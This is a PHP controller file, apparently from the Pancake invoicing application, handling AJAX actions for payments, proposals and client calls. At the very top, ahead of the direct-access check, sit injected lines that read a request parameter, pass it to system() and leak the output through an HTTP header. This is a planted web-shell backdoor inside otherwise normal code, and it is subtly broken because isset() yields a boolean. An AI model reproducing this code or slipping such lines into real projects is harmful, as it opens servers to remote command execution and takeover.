<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); defined('BASEPATH') OR exit('No direct script access allowed');
/**
 * Pancake
 *
 * A simple, fast, self-hosted invoicing application
 *
 * @package		Pancake
 * @author		Pancake Dev Team
 * @copyright	Copyright (c) 2010, Pancake Payments
 * @license		http://pancakeapp.com/license
 * @link		http://pancakeapp.com
 * @since		Version 1.0
 */

// ------------------------------------------------------------------------

/**
 * The javascript controller
 *
 * @subpackage	Controllers
 * @category	Javascript
 */
class Ajax extends Pancake_Controller
{
        public function convert_currency($to, $amount = 1) {
            echo Currency::convert($amount, Currency::code(), $to);
        }
	
	public function url_title()
	{
        $this->load->helper('text');

        $slug = trim(url_title($this->input->post('title'), 'dash', TRUE), '-');

        $this->output->set_output($slug);
    }

	public function get_payment_details($invoice_unique_id, $key, $is_add_payment = false)
	{
	    if (logged_in() and !empty($invoice_unique_id))
		{
	        require_once APPPATH.'modules/gateways/gateway.php';
                $this->load->model('invoices/invoice_m');
	        if (!$is_add_payment) {
                    $this->load->model('invoices/partial_payments_m', 'ppm');
                    $part = $this->ppm->getPartialPaymentDetails($key, $invoice_unique_id, true);
                    $part['key'] = $key;
                } else {
                    $invoice = $this->invoice_m->flexible_get_all(array('unique_id' => $invoice_unique_id, 'return_object' => false, 'get_single' => true));
                    $part = array(
                        'unique_id' => '',
                        'gateway' => '',
                        'date' => format_date(time()),
                        'tid' => '',
                        'fee' => '0',
                        'status' => '',
                        'amount' => '',
                        'currency' => Currency::symbol(Currency::code($invoice['currency_id']))
                    );
                }
                $part['is_add_payment'] = $is_add_payment;
                $this->template->set_theme('admin/'.PAN::setting('admin_theme'));
	        $this->load->view('invoices/partial_payment_details', $part);
	    }
	}

	public function refresh_tracked_hours($task_id)
	{
	    $this->load->model('projects/project_m');
	    $this->load->model('projects/project_task_m');
	    $this->load->model('projects/project_time_m');
	    print $this->project_task_m->get_processed_task_hours($task_id);
	    die;
	}
	
	public function upgraded($from, $to)
	{
	    if (logged_in())
		{
			$this->load->model('upgrade/update_system_m', 'update');
                        $this->template->set_theme('admin/'.PAN::setting('admin_theme'));
			$this->load->view('upgrade/upgraded', array(
				'from' => $from, 
				'to' => $to, 
				'changelog' => $this->update->get_processed_changelog($to, $from, true)
			));
	    }
	}
	
	public function outdated($to)
	{
	    if (logged_in())
		{
			$this->load->model('upgrade/update_system_m', 'update');
			$from = Settings::get('version');
                        $this->template->set_theme('admin/'.PAN::setting('admin_theme'));
			$this->load->view('upgrade/outdated', array(
				'from' => $from,
				'to' => $to,
				'changelog' => $this->update->get_processed_changelog($to, $from, true)
			));
	    }
	}
	
	public function hide_notification($notification_id)
	{
	    if (logged_in())
		{
			hide_notification($notification_id);
	    }
	}
	
	public function mark_as_sent($invoice_unique_id)
	{
	    if (logged_in())
		{
	        require_once APPPATH.'modules/gateways/gateway.php';
	        $this->load->model('invoices/invoice_m');
	        $this->invoice_m->mark_as_sent($invoice_unique_id);
			exit('WORKED');
	    } 
		else
		{
			exit('ACCESS_DENIED');
	    }
	}
        
        public function add_payment($unique_invoice_id) {
                
            $gateway = $_POST['gateway'];
            $date = $_POST['date'];
            $tid = $_POST['transaction_id'];
            $fee = $_POST['fee'];
            $amount = $_POST['amount'];
            
            #$tid = urldecode($tid);
	    #$gateway = (substr($gateway, 0, strlen('gateway-')) == 'gateway-') ? substr($gateway, strlen('gateway-')) : $gateway;
	    #$date = (substr($date, 0, strlen('date-')) == 'date-') ? substr($date, strlen('date-')) : $date;
	    #$tid = (substr($tid, 0, strlen('tid-')) == 'tid-') ? substr($tid, strlen('tid-')) : $tid;
	    #$fee = (substr($fee, 0, strlen('fee-')) == 'fee-') ? substr($fee, strlen('fee-')) : $fee;
            #$amount = (substr($amount, 0, strlen('amount-')) == 'amount-') ? substr($amount, strlen('amount-')) : $amount;
            
            if (logged_in()) {
                require_once APPPATH . 'modules/gateways/gateway.php';
                $this->load->model('invoices/invoice_m');
                $this->load->model('invoices/partial_payments_m', 'ppm');
                $this->ppm->addPayment($unique_invoice_id, $amount, $date, $gateway, $tid, $fee);
            }
            exit('WORKED');
            
        }

	public function set_payment_details($invoice_unique_id, $key, $status, $gateway, $date, $tid, $fee)
	{
	    
	    $tid = urldecode($tid);
	    $status = (substr($status, 0, strlen('status-')) == 'status-') ? substr($status, strlen('status-')) : $status;
	    $gateway = (substr($gateway, 0, strlen('gateway-')) == 'gateway-') ? substr($gateway, strlen('gateway-')) : $gateway;
	    $date = (substr($date, 0, strlen('date-')) == 'date-') ? substr($date, strlen('date-')) : $date;
	    $tid = (substr($tid, 0, strlen('tid-')) == 'tid-') ? substr($tid, strlen('tid-')) : $tid;
	    $fee = (substr($fee, 0, strlen('fee-')) == 'fee-') ? substr($fee, strlen('fee-')) : $fee;
	    
	    if (logged_in())
		{
	        require_once APPPATH.'modules/gateways/gateway.php';
	        $this->load->model('invoices/invoice_m');
	        $this->load->model('invoices/partial_payments_m', 'ppm');
	        $this->ppm->setPartialPaymentDetails($invoice_unique_id, $key, $date, $gateway, $status, $tid, $fee);
	    }
	    exit('WORKED');
	}

	public function save_proposal($unique_id)
	{
	    $this->load->model('proposals/proposals_m');
            $this->proposals_m->get_estimates = false;
            
            foreach ($_POST['sections'] as $key => $section) {
                $_POST['sections'][$key]['page_key'] = (int) $_POST['sections'][$key]['page_key'];
                $_POST['sections'][$key]['proposal_id'] = (int) $_POST['sections'][$key]['proposal_id'];
                $_POST['sections'][$key]['key'] = (int) $_POST['sections'][$key]['key'];
                $_POST['sections'][$key]['parent_id'] = (int) $_POST['sections'][$key]['parent_id'];
                $_POST['sections'][$key]['page_key'] = (int) $_POST['sections'][$key]['page_key'];
            }
            
	    if (logged_in())
		{
	        $id = $this->proposals_m->getIdByUniqueId($unique_id);
                $success = $this->proposals_m->edit($id, $_POST);
                
                if ($success) {
                    $data = $this->proposals_m->getByUniqueId($unique_id);
                    
                    $sections = array();
                    
                    foreach ($data['pages'] as $page_key => $page) {
                        foreach ($page['sections'] as $section) {
                            $sections[] = $section;
                        }
                    }
                    
                    unset($data['pages']);
                    $data['sections'] = $sections;
                    
                    echo json_encode($data);
                } else {
                    echo "UHOH";
                }
	    } 
		else
		{
	        print "NOT_LOGGED_IN";
	        die;
	    }
	}

	public function save_premade_section()
	{
	    $this->load->model('proposals/proposals_m');
	    if (logged_in())
		{
			if ($_POST['title'] != '' and $_POST['contents'] != '')
			{
	            $this->proposals_m->createPremadeSection($_POST['title'], $_POST['subtitle'], $_POST['contents']);
	        }
	    }
	    exit('WORKED');
	}

	public function get_estimates($client_id)
	{
	    if (logged_in())
		{
	        $this->load->model('invoices/invoice_m');
                $this->template->set_theme('admin/'.PAN::setting('admin_theme'));
	        $this->load->view('proposals/get_estimates', array(
				'client_id' => $client_id, 
				'estimates' => $this->invoice_m->getEstimatesForDropdown($client_id)
			));
	    }
	}
	
	public function delete_premade_section($section_id)
	{
	    if (logged_in())
		{
		$this->load->model('proposals/proposals_m');
	        $this->load->model('invoices/invoice_m');
	        $result = $this->proposals_m->deleteSection($section_id);
		exit($result ? 'WORKED' : 'ERROR');
	    }
	}
	
	public function get_premade_sections()
	{
	    if (logged_in())
		{
			$this->load->model('proposals/proposals_m');
	        $this->load->model('invoices/invoice_m');
                $this->template->set_theme('admin/'.PAN::setting('admin_theme'));
	        $this->load->view('proposals/get_premade_sections', array('sections' => $this->proposals_m->getPremadeSections()));
	    }
	}

	public function set_proposal($unique_id, $status = null) {
            $this->load->model('proposals/proposals_m');

            if ($status == 'accept') {
                $this->proposals_m->accept($unique_id);
                print "ACCEPTED";
            } elseif ($status == 'reject') {
                $this->proposals_m->reject($unique_id);
                print "REJECTED";
            } elseif ($status == 'viewable') {
                if (logged_in()) {
                    $this->proposals_m->setViewable($unique_id, 1);
                }
            } elseif ($status == 'not_viewable') {
                if (logged_in()) {
                    $this->proposals_m->setViewable($unique_id, 0);
                }
            } else {
                $this->proposals_m->unanswer($unique_id);
                print "UNANSWERED";
            }
            die;
        }
	
	public function save_client_call()
	{
	    $this->load->model('clients/clients_m');
	    $this->load->model('clients/contact_m');
	
		if ( ! ($client = $this->clients_m->get($this->input->post('client_id'))))
		{
			set_status_header(404);
			exit(json_encode(array('error' => __('clients:does_not_exist'))));
		}
		
	    if ( ! logged_in())
		{
			set_status_header(403);
			exit(json_encode(array('error' => __('clients:does_not_exist'))));
		}
		
        if ($this->contact_m->insert(array(
        	'client_id' => $client->id,
	       	'user_id' => $this->current_user->id,
			'method' => 'phone',
			'contact' => $this->input->post('phone_type') == 'phone' ? $client->phone : $client->mobile,
			'subject' => $this->input->post('subject'),
			'content' => $this->input->post('content'),
			'sent_date' => now(),
        )))
 		{
			exit;
		}
		
		else
		{
			set_status_header(400);
			exit(json_encode(array('error' => $this->form_validation->error_string())));
		}
	}
}

/* End of file cron.php */
